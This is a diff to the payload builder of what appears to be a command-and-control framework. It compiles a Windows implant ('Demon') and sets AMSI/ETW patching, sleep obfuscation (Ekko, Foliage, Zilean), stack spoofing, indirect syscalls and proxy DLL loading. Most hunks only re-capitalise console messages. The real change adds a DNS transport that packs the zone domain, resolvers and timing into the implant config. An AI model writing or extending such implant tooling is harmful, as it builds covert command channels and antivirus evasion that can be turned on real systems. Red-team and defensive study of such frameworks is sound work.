@@ -3,6 +3,7 @@ package builder
 import (
 	"bytes"
 	"crypto/rand"
+
 	//"encoding/hex"
 	"encoding/json"
 	"errors"
@@ -253,7 +254,7 @@ func (b *Builder) Build() bool {
 	}
 
 	if !b.silent {
-		b.SendConsoleMessage("Info", "starting build")
+		b.SendConsoleMessage("Info", "Starting Build")
 		if b.compilerOptions.Config.DebugDev {
 			b.SendConsoleMessage("Info", "================================================================")
 			b.SendConsoleMessage("Info", "  DEBUG BUILD (--debug-dev)")
@@ -273,7 +274,7 @@ func (b *Builder) Build() bool {
 	}
 
 	if !b.silent {
-		b.SendConsoleMessage("Info", fmt.Sprintf("config size [%v bytes]", len(Config)))
+		b.SendConsoleMessage("Info", fmt.Sprintf("Config Size [%v bytes]", len(Config)))
 	}
 
 	// [HVC-014 2026-04-28] Encrypt the embedded config with AES-256-CTR.
@@ -390,7 +391,7 @@ func (b *Builder) Build() bool {
 
 		if err != nil {
 			if !b.silent {
-				b.SendConsoleMessage("Error", fmt.Sprintf("failed to resolve x64 compiler path: %v", err))
+				b.SendConsoleMessage("Error", fmt.Sprintf("Failed to resolve x64 compiler path: %v", err))
 				return false
 			}
 		}
@@ -402,7 +403,7 @@ func (b *Builder) Build() bool {
 
 		if err != nil {
 			if !b.silent {
-				b.SendConsoleMessage("Error", fmt.Sprintf("failed to resolve x86 compiler path: %v", err))
+				b.SendConsoleMessage("Error", fmt.Sprintf("Failed to resolve x86 compiler path: %v", err))
 				return false
 			}
 		}
@@ -515,10 +516,10 @@ func (b *Builder) Build() bool {
 		if b.innerBuilderSetup != nil {
 			b.innerBuilderSetup(DllPayload)
 		}
-		b.SendConsoleMessage("Info", "compiling core dll...")
+		b.SendConsoleMessage("Info", "Compiling Core DLL...")
 		if DllPayload.Build() {
 
-			logger.Debug("Successful compiled Dll")
+			logger.Debug("Successful Compiled DLL")
 			var (
 				ShellcodePath   string
 				DllPayloadBytes []byte
@@ -564,7 +565,7 @@ func (b *Builder) Build() bool {
 	CompileCommand += "-o " + b.outputPath
 
 	if !b.silent {
-		b.SendConsoleMessage("Info", "compiling source")
+		b.SendConsoleMessage("Info", "Compiling Source...")
 	}
 
 	//logger.Debug(CompileCommand)
@@ -656,7 +657,7 @@ func (b *Builder) verifyNoDebugStringsInBinary(path string) error {
 			}
 		}
 		return fmt.Errorf(
-			"binary at %s contains debug-output marker %q at offset %d (context: %q)",
+			"Binary at %s contains debug-output marker %q at offset %d (context: %q)",
 			path, marker, idx, string(safe),
 		)
 	}
@@ -699,8 +700,8 @@ func (b *Builder) SetConfig(Config string) error {
 
 	err := json.Unmarshal([]byte(Config), &b.config.Config)
 	if err != nil {
-		logger.Error("Failed to Unmarshal json to object: " + err.Error())
-		b.SendConsoleMessage("Error", "failed to Unmarshal json to object: "+err.Error())
+		logger.Error("Failed to Unmarshal JSON to Object: " + err.Error())
+		b.SendConsoleMessage("Error", "Failed to Unmarshal JSON to Object: "+err.Error())
 		return err
 	}
 
@@ -741,7 +742,7 @@ func (b *Builder) Patch(ByteArray []byte) []byte {
 					new = append(new, bytes.Repeat([]byte{0}, len(old)-len(new))...)
 				}
 				if len(new) > len(old) {
-					logger.Error(fmt.Sprintf("invalid replacement rule, new value (%s) can be longer than the old value (%s)", string(new), old))
+					logger.Error(fmt.Sprintf("Invalid Replacement Rule, New Value (%s) Can Be Longer Than The Old Value (%s)", string(new), old))
 				} else {
 					ByteArray = bytes.Replace(ByteArray, []byte(old), new, -1)
 				}
@@ -762,7 +763,7 @@ func (b *Builder) Patch(ByteArray []byte) []byte {
 					new = append(new, bytes.Repeat([]byte{0}, len(old)-len(new))...)
 				}
 				if len(new) > len(old) {
-					logger.Error(fmt.Sprintf("invalid replacement rule, new value (%s) can be longer than the old value (%s)", string(new), old))
+					logger.Error(fmt.Sprintf("Invalid Replacement Rule, New Value (%s) Can Be Longer Than The Old Value (%s)", string(new), old))
 				} else {
 					ByteArray = bytes.Replace(ByteArray, []byte(old), new, -1)
 				}
@@ -797,7 +798,7 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 		ConfigSleep, err = strconv.Atoi(val)
 		if err != nil {
 			if !b.silent {
-				b.SendConsoleMessage("Error", "failed to convert Sleep string to int: "+err.Error())
+				b.SendConsoleMessage("Error", "Failed to Convert Sleep String to Int: "+err.Error())
 			}
 			return nil, err
 		}
@@ -807,7 +808,7 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 		ConfigJitter, err = strconv.Atoi(val)
 		if err != nil {
 			if !b.silent {
-				b.SendConsoleMessage("Error", "failed to convert Jitter string to int: "+err.Error())
+				b.SendConsoleMessage("Error", "Failed to Convert Jitter String to Int: "+err.Error())
 			}
 			return nil, err
 		}
@@ -815,7 +816,7 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 			return nil, errors.New("Jitter has to be between 0 and 100")
 		}
 	} else {
-		b.SendConsoleMessage("Info", "jitter not found?")
+		b.SendConsoleMessage("Info", "Jitter Not Found?")
 		ConfigJitter = 0
 	}
 
@@ -823,7 +824,7 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 		if val {
 			ConfigSyscall = win32.TRUE
 			if !b.silent {
-				b.SendConsoleMessage("Info", "indirect syscalls has been enabled")
+				b.SendConsoleMessage("Info", "Indirect Syscalls: Enabled")
 			}
 		}
 	}
@@ -833,14 +834,14 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 			if len(val) > 0 {
 				b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SERVICE_NAME=\\\""+val+"\\\"")
 				if !b.silent {
-					b.SendConsoleMessage("Info", "set service name to "+val)
+					b.SendConsoleMessage("Info", "Set Service Name: "+val)
 				}
 			} else {
 				val = common.RandomString(6)
 				b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SERVICE_NAME=\\\""+val+"\\\"")
 				if !b.silent {
-					b.SendConsoleMessage("Info", "service name not specified... using random name")
-					b.SendConsoleMessage("Info", "set service name to "+val)
+					b.SendConsoleMessage("Info", "Service Name Not Specified: Using Random Name - "+val)
+					b.SendConsoleMessage("Info", "Set Service Name: "+val)
 				}
 			}
 		}
@@ -908,28 +909,28 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 		case "WaitForSingleObjectEx":
 			ConfigObfTechnique = SLEEPOBF_NO_OBF
 			if !b.silent {
-				b.SendConsoleMessage("Info", "no sleep obfuscation has been specified")
+				b.SendConsoleMessage("Info", "Sleep Obfuscation: None")
 			}
 			break
 
 		case "Foliage":
 			ConfigObfTechnique = SLEEPOBF_FOLIAGE
 			if !b.silent {
-				b.SendConsoleMessage("Info", "sleep obfuscation \"Foliage\" has been specified")
+				b.SendConsoleMessage("Info", "Sleep Obfuscation: \"Foliage\"")
 			}
 			break
 
 		case "Ekko":
 			ConfigObfTechnique = SLEEPOBF_EKKO
 			if !b.silent {
-				b.SendConsoleMessage("Info", "sleep obfuscation \"Ekko\" has been specified")
+				b.SendConsoleMessage("Info", "Sleep Obfuscation: \"Ekko\"")
 			}
 			break
 
 		case "Zilean":
 			ConfigObfTechnique = SLEEPOBF_ZILEAN
 			if !b.silent {
-				b.SendConsoleMessage("Info", "sleep obfuscation \"Zilean\" has been specified")
+				b.SendConsoleMessage("Info", "Sleep Obfuscation \"Zilean\"")
 			}
 			break
 
@@ -949,7 +950,7 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 			b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SLEEPOBF_USE_TIMER")
 		}
 	} else {
-		return nil, errors.New("sleep Obfuscation technique is undefined")
+		return nil, errors.New("Sleep Obfuscation technique is undefined")
 	}
 
 	if val, ok := b.config.Config["Sleep Jmp Gadget"].(string); ok && len(val) > 0 {
@@ -959,21 +960,21 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 			case "jmp rax":
 				ConfigObfBypass = SLEEPOBF_BYPASS_JMPRAX
 				if !b.silent {
-					b.SendConsoleMessage("Info", "sleep jump gadget \"jmp rax\" has been specified")
+					b.SendConsoleMessage("Info", "Sleep Jump Gadget: \"jmp rax\"")
 				}
 				break
 
 			case "jmp rbx":
 				ConfigObfBypass = SLEEPOBF_BYPASS_JMPRBX
 				if !b.silent {
-					b.SendConsoleMessage("Info", "sleep jump gadget \"jmp rbx\" has been specified")
+					b.SendConsoleMessage("Info", "Sleep Jump Gadget: \"jmp rbx\"")
 				}
 				break
 
 			default:
 				ConfigObfBypass = SLEEPOBF_BYPASS_NONE
 				if !b.silent {
-					b.SendConsoleMessage("Info", "no sleep jump gadget has been specified")
+					b.SendConsoleMessage("Info", "Sleep Jump Gadget: None")
 				}
 				break
 			}
@@ -981,7 +982,7 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 			// if no sleep obfuscation technique has been specified then
 			// no jmp gadgets are going to be used.
 			if !b.silent {
-				b.SendConsoleMessage("Info", "sleep jump gadget option ignored")
+				b.SendConsoleMessage("Info", "Sleep Jump Gadget Option Ignored")
 			}
 		}
 
@@ -994,14 +995,14 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 			if val {
 				ConfigStackSpoof = win32.TRUE
 				if !b.silent {
-					b.SendConsoleMessage("Info", "stack duplication has been specified")
+					b.SendConsoleMessage("Info", "Stack Duplication: Enabled")
 				}
 			}
 		} else {
 			// if no sleep obfuscation technique has been specified then
 			// stack spoofing is not possible during sleep lol.
 			if !b.silent {
-				b.SendConsoleMessage("Info", "stack duplication option ignored")
+				b.SendConsoleMessage("Info", "Stack Duplication: Disabled")
 			}
 		}
 	} else {
@@ -1013,35 +1014,35 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 		case "None (LdrLoadDll)":
 			ConfigProxyLoading = PROXYLOADING_NONE
 			if !b.silent {
-				b.SendConsoleMessage("Info", "no proxy loading technique specified (using LdrLoadDll)")
+				b.SendConsoleMessage("Info", "Proxy Loading Technique: None (using LdrLoadDll)")
 			}
 			break
 
 		case "RtlRegisterWait":
 			ConfigProxyLoading = PROXYLOADING_RTLREGISTERWAIT
 			if !b.silent {
-				b.SendConsoleMessage("Info", "proxy loading technique: RtlRegisterWait")
+				b.SendConsoleMessage("Info", "Proxy Loading Technique: RtlRegisterWait")
 			}
 			break
 
 		case "RtlCreateTimer":
 			ConfigProxyLoading = PROXYLOADING_RTLCREATETIMER
 			if !b.silent {
-				b.SendConsoleMessage("Info", "proxy loading technique: RtlCreateTimer")
+				b.SendConsoleMessage("Info", "proxy Loading Technique: RtlCreateTimer")
 			}
 			break
 
 		case "RtlQueueWorkItem":
 			ConfigProxyLoading = PROXYLOADING_RTLQUEUEWORKITEM
 			if !b.silent {
-				b.SendConsoleMessage("Info", "proxy loading technique: RtlQueueWorkItem")
+				b.SendConsoleMessage("Info", "Proxy Loading Technique: RtlQueueWorkItem")
 			}
 			break
 
 		default:
 			ConfigProxyLoading = PROXYLOADING_NONE
 			if !b.silent {
-				b.SendConsoleMessage("Info", "no proxy loading technique specified (using LdrLoadDll)")
+				b.SendConsoleMessage("Info", "Proxy Loading Technique: None (using LdrLoadDll)")
 			}
 			break
 		}
@@ -1055,19 +1056,19 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 		case "Hardware breakpoints", "HWBP":
 			ConfigAmsiPatch = AMSIETW_PATCH_HWBP
 			if !b.silent {
-				b.SendConsoleMessage("Info", "amsi/etw patching technique: hardware breakpoints")
+				b.SendConsoleMessage("Info", "AMSI/ETW Patch Technique: Hardware Breakpoints")
 			}
 			break
 
 		default:
 			ConfigAmsiPatch = AMSIETW_PATCH_NONE
 			if !b.silent {
-				b.SendConsoleMessage("Info", "amsi/etw patching disabled")
+				b.SendConsoleMessage("Info", "AMSI/ETW Patch Technique: Disabled")
 			}
 			break
 		}
 	} else {
-		return nil, errors.New("Amsi/Etw Patch is undefined")
+		return nil, errors.New("AMSI/ETW Patch Undefined")
 	}
 
 	// behaviour configuration (alloc/exec/spawn)
@@ -1237,6 +1238,21 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 		DemonConfig.AddInt32(WorkingHours)
 
 		break
+
+	case handlers.LISTENER_DNS:
+		var Config = b.config.ListenerConfig.(*handlers.DNS)
+
+		// Pack: ZoneDomain (WString), ResolverCount (Int32), Resolvers[]..., Port (Int32), QueryTimeout (Int32), ChunkDelayMs (Int32)
+		DemonConfig.AddWString(Config.Config.ZoneDomain)
+		DemonConfig.AddInt32(int32(len(Config.Config.Hosts)))
+		for _, host := range Config.Config.Hosts {
+			DemonConfig.AddWString(host)
+		}
+		DemonConfig.AddInt32(int32(Config.Config.Port))
+		DemonConfig.AddInt32(int32(Config.Config.QueryTimeout))
+		DemonConfig.AddInt32(int32(Config.Config.ChunkDelayMs))
+
+		break
 	}
 
 	//logger.Debug("DemonConfig:\n" + hex.Dump(DemonConfig.Buffer()))
@@ -1247,7 +1263,7 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 func (b *Builder) GetPayloadBytes() []byte {
 
 	if len(b.preBytes) > 0 {
-		b.SendConsoleMessage("Good", "payload generated")
+		b.SendConsoleMessage("Good", "Payload Generated")
 		return b.preBytes
 	}
 
@@ -1257,18 +1273,18 @@ func (b *Builder) GetPayloadBytes() []byte {
 	)
 
 	if b.outputPath == "" {
-		logger.Error("Output Path is empty")
+		logger.Error("Output Path Empty")
 		if !b.silent {
-			b.SendConsoleMessage("Error", "output Path is empty")
+			b.SendConsoleMessage("Error", "Output Path Empty")
 		}
 		return nil
 	}
 
 	FileBuffer, err = os.ReadFile(b.outputPath)
 	if err != nil {
-		logger.Error("Couldn't read content of file: " + err.Error())
+		logger.Error("Couldn't Read Content of File: " + err.Error())
 		if !b.silent {
-			b.SendConsoleMessage("Error", "couldn't read content of file: "+err.Error())
+			b.SendConsoleMessage("Error", "Couldn't Read Content of File: "+err.Error())
 		}
 		return nil
 	}
@@ -1278,7 +1294,7 @@ func (b *Builder) GetPayloadBytes() []byte {
 	}
 
 	if !b.silent {
-		b.SendConsoleMessage("Good", "payload generated")
+		b.SendConsoleMessage("Good", "Payload Generated")
 	}
 
 	return FileBuffer
@@ -1289,10 +1305,10 @@ func (b *Builder) Cmd(cmd string) bool {
 	if b.testCmdRunner != nil {
 		ok, errOut := b.testCmdRunner(cmd)
 		if !ok {
-			logger.Error("Couldn't compile implant (test runner): " + errOut)
+			logger.Error("Couldn't Compile implant (test runner): " + errOut)
 			if !b.silent {
-				b.SendConsoleMessage("Error", "couldn't compile implant: "+errOut)
-				b.SendConsoleMessage("Error", "compile output: "+errOut)
+				b.SendConsoleMessage("Error", "Couldn't Compile implant: "+errOut)
+				b.SendConsoleMessage("Error", "Compile Output: "+errOut)
 			}
 		}
 		return ok
@@ -1311,10 +1327,10 @@ func (b *Builder) Cmd(cmd string) bool {
 
 	err = Command.Run()
 	if err != nil {
-		logger.Error("Couldn't compile implant: " + err.Error())
+		logger.Error("Couldn't Compile implant: " + err.Error())
 		if !b.silent {
-			b.SendConsoleMessage("Error", "couldn't compile implant: "+err.Error())
-			b.SendConsoleMessage("Error", "compile output: "+stderr.String())
+			b.SendConsoleMessage("Error", "Couldn't Compile implant: "+err.Error())
+			b.SendConsoleMessage("Error", "Compile Output: "+stderr.String())
 		}
 		logger.Debug(cmd)
 		logger.Debug("StdErr:\n" + stderr.String())
@@ -1327,7 +1343,7 @@ func (b *Builder) CompileCmd(cmd string) bool {
 
 	if b.Cmd(cmd) {
 		if !b.silent {
-			b.SendConsoleMessage("Info", "finished compiling source")
+			b.SendConsoleMessage("Info", "Finished Compiling Source")
 		}
 		return true
 	}
@@ -1348,6 +1364,11 @@ func (b *Builder) GetListenerDefines() []string {
 	case handlers.LISTENER_PIVOT_SMB:
 
 		defines = append(defines, "TRANSPORT_SMB")
+		break
+
+	case handlers.LISTENER_DNS:
+
+		defines = append(defines, "TRANSPORT_DNS")
 		break
 
 	}
